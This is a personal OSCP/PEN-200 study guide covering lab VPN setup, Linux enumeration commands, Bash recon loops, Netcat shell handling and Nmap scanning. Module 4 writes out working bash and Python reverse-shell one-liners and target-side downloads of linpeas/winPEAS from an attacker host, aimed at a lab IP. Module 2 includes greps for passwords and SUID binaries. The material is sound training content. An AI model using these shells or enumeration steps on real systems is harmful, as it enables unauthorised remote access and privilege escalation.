---
tags:
  - oscp
  - pen200
  - theory
  - modules1-5
  - foundations
  - nmap
  - netcat
created: 2026-07-31
status: in-progress
linear_task: GIA-93
---

# 📖 PEN-200 Modules 1–5 Study Guide & Tool Deep-Dive

> **Target Goal:** Master Linux CLI fundamentals, essential Bash scripting, Netcat/Socat shell mechanics, and foundational network scanning with Nmap.

---

## 📌 Module 1: PEN-200 Orientation & Lab Environment Setup

> [!info] 💡 Tool Context: **OpenVPN**
> - **What it is:** An open-source Virtual Private Network (VPN) software that creates encrypted point-to-point tunnels.
> - **When to use:** At the start of every lab or exam session to bridge your local machine to the OffSec internal network.
> - **Why it's helpful:** Routes all traffic seamlessly through a dedicated `tun0` interface into OffSec target subnets (e.g. `10.11.1.x`).
> - **Pros:** Highly reliable, standard `.ovpn` configuration profiles.
> - **Cons & Caveats:** Requires `sudo` privileges to modify routes and `tun` devices; VPN drops will disrupt open reverse shell sessions.

### Key Objectives
- Understand OffSec lab policy, VPN connection (`.ovpn`), and target reachability checks.
- Establish structured note-taking in Obsidian for lab machines and exam reports.

### Operational Setup & VPN Verification
```bash
# Connect to OffSec Lab VPN
sudo openvpn --config lab-connection.ovpn

# Verify connectivity & IP assignment on tun0 interface
ip a show tun0
ping -c 3 10.11.1.x
```

### Best Practices & Rules of Engagement
- **Keep thorough logs:** Capture terminal outputs, IP targets, and exact command strings.
- **Isolate target artifacts:** Store exploits, loot, and flags in dedicated machine subdirectories (`~/oscp/targets/<IP>/`).

---

## 📌 Module 2: Linux CLI Essentials

> [!info] 💡 Tool Context: **Linux Search & Text Parsers (`find`, `grep`, `awk`, `sed`)**
> - **What it is:** Core Unix tools for filesystem searching (`find`), regex pattern filtering (`grep`), field-based stream parsing (`awk`), and text replacement (`sed`).
> - **When to use:** During local enumeration for privilege escalation (finding SUID/SGID binaries, exposed credentials in config files) and when parsing scan outputs into clean target lists.
> - **Why it's helpful:** Preinstalled on every Linux target—no need to download external tools.
> - **Pros:** Extremely fast, scriptable, zero footprint.
> - **Cons & Caveats:** Tricky syntax and regex escaping; misconstructed `find` queries can flood output without `2>/dev/null`.

### Essential File System Navigation & Searching
```bash
# Search for files by name or permission
find / -name "config.php" 2>/dev/null
find / -perm -4000 -type f 2>/dev/null # Find SUID binaries

# Text processing & filtering
grep -rnw '/var/www/html/' -e 'password'
cat /etc/passwd | cut -d: -f1,3 | grep -v 'nobody'
awk -F: '$3 == 0 {print $1}' /etc/passwd # Check root-equivalent users
```

### Managing Permissions & Services
```bash
# File permissions
chmod 600 id_rsa            # Secure SSH private key
chmod +x exploit.sh         # Mark executable

# Managing local services
sudo systemctl status ssh
sudo systemctl start apache2
```

---

## 📌 Module 3: Bash Scripting & Automation

> [!info] 💡 Tool Context: **Bash & Utility Scripting**
> - **What it is:** The default Unix command processor and shell language.
> - **When to use:** To chain commands, automate repetitive recon tasks (e.g. subnet ping sweeps), and craft rapid exploit wrappers.
> - **Why it's helpful:** Eliminates manual repetition and accelerates initial network discovery.
> - **Pros:** Universally supported across Linux environments, native integration with pipes (`|`) and subshells.
> - **Cons & Caveats:** Lack of native error handling compared to Python; slow for heavy multi-threaded network logic.

### One-Liners & Useful Automation Patterns
```bash
# Live Host Discovery Ping Sweep
for i in {1..254}; do ping -c 1 -W 1 10.11.1.$i | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" & done

# Port Scanning Ping Sweep (NC port check)
for port in 21 22 80 445 3389; do
  nc -zv -w1 10.11.1.100 $port 2>&1 | grep open
done
```

### Parsing Tool Output (grep / sed / awk / tr)
```bash
# Extract open ports from Nmap greppable output (-oG / -oG)
grep -E -o '([0-9]{1,5})/open' nmap_scan.gnmap | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//'
```

---

## 📌 Module 4: Netcat, Socat & File Transfers

> [!info] 💡 Tool Context: **Netcat (`nc`) & Socat**
> - **What it is:** Network utilities for reading and writing raw data across TCP/UDP connections ("The Swiss Army Knife of Networking").
> - **When to use:** Catching reverse shells, setting up bind listeners, testing raw port connectivity, banner grabbing, and simple file transfers.
> - **Why it's helpful:** Lightweight, versatile, and present on nearly all Linux distributions.
> - **Pros:** Extremely fast setup (`nc -nvlp 4444`), minimal footprint.
> - **Cons & Caveats:** Raw Netcat shells lack TTY features (no tab completion, arrow keys, or `Ctrl+C` handling without manual PTY upgrade); unencrypted data stream. *Socat offers full TTY and SSL encryption, but is less commonly preinstalled on target hosts.*

### Shell Catching with Netcat
```bash
# Listener (Kali / Attack Machine)
nc -nvlp 4444

# Reverse Shells (Target Machine)
# Linux Bash Reverse Shell
bash -i >& /dev/tcp/10.11.0.X/4444 0>&1

# Python Reverse Shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.X",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### Full TTY Shell Upgrades
```bash
# Step 1: Spawn pseudo-terminal inside reverse shell
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell with Ctrl+Z
# Step 3: On local Kali terminal, fix raw terminal echo:
stty raw -echo; fg

# Step 4: Reset terminal type and dimensions
export TERM=xterm
stty rows 38 cols 160
```

### Quick File Transfers
```bash
# Host HTTP server on Kali
python3 -m http.server 80

# Download on Target (Linux)
wget http://10.11.0.X/linpeas.sh -O /tmp/linpeas.sh
curl http://10.11.0.X/linpeas.sh -o /tmp/linpeas.sh

# Download on Target (Windows PowerShell)
iwr -uri http://10.11.0.X/winPEAS.exe -OutFile C:\Windows\Tasks\winPEAS.exe
```

---

## 📌 Module 5: Foundational Port Scanning & Recon (Nmap)

> [!info] 💡 Tool Context: **Nmap (Network Mapper)**
> - **What it is:** An open-source network exploration scanner used to discover hosts, open ports, OS types, and running service versions.
> - **When to use:** As the mandatory **first step** upon obtaining a target IP address to map its full attack surface.
> - **Why it's helpful:** Combines fast port discovery, service version fingerprinting (`-sV`), OS detection (`-O`), and scriptable vulnerability probing (Nmap Scripting Engine / NSE `-sC`).
> - **Pros:**
>   - Industry standard, highly flexible flags, powerful NSE scripting engine.
>   - Handles both TCP and UDP protocols across all 65,535 ports.
> - **Cons & Caveats:**
>   - SYN Stealth scans (`-sS`) require `sudo`/root permissions.
>   - Aggressive speeds (`-T4` or high `--min-rate 1000`) can drop packets over unstable VPNs, trigger IPS/firewall blocks, or crash fragile legacy target services.
>   - UDP scans (`-sU`) are significantly slower due to ICMP rate limits.

### Nmap Scanning Mechanics Breakdown

#### 1. Scan Types (`-sS` vs `-sT` vs `-sU`)
- **SYN Stealth Scan (`-sS` - Default with `sudo`):** Sends a TCP SYN packet. If target responds with `SYN/ACK`, port is OPEN; Nmap sends `RST` to close connection without completing 3-way handshake. *Fast and avoids full connection logging.*
- **TCP Connect Scan (`-sT` - Default without `sudo`):** Completes full 3-way TCP handshake (`SYN` -> `SYN/ACK` -> `ACK`). *Slower and noisy in application logs.*
- **UDP Scan (`-sU`):** Scans stateless UDP services (DNS, SNMP, NTP, DHCP). *Slow because non-responsive ports require waiting for timeout or ICMP port unreachable errors.*

#### 2. Scan Workflow Strategy
```bash
# Step 1: Fast initial TCP scan (top 1,000 ports with scripts and versions)
sudo nmap -sC -sV -oN nmap_initial.txt 10.11.1.X

# Step 2: Full 65,535 TCP port scan in background to capture non-standard ports
sudo nmap -p- --min-rate 1000 -oN nmap_allports.txt 10.11.1.X

# Step 3: Targeted deep scan on any newly discovered non-standard ports
sudo nmap -p 8080,8443,49152 -sC -sV -A -oN nmap_targeted.txt 10.11.1.X

# Step 4: Top 20 UDP scan
sudo nmap -sU --top-ports 20 -oN nmap_udp.txt 10.11.1.X
```

### Essential Nmap Flags Breakdown
| Flag | Meaning | What it does / When to use |
| :--- | :--- | :--- |
| `-sS` | SYN Stealth Scan | Fast TCP scan, avoids full handshake logging (requires `sudo`). |
| `-sT` | TCP Connect Scan | Full handshake scan, fallback when non-root. |
| `-sV` | Service Version Detection | Probes open ports to determine banner & exact service version. |
| `-sC` | Default NSE Scripts | Runs default safe Lua scripts for banner grabbing and basic vulns. |
| `-p-` | Scan all 65,535 ports | Essential so you don't miss services hosted on custom high ports. |
| `--min-rate 1000` | Minimum Packet Rate | Forces Nmap to send at least 1,000 pkts/sec for high-speed lab scans. |
| `-oN` | Normal Output File | Saves human-readable output to disk (mandatory for reporting). |
| `-oG` | Greppable Output File | Saves single-line output format, easy to parse with `grep`/`awk`. |

---

## 🔗 Related Notes & Next Steps
- [[07 Foundational Command Cheat Sheet (Linux, Netcat, Nmap)]]
- [[Template - Standalone Machine Target Note]]
- [[01 Theory Roadmap & Resources]]
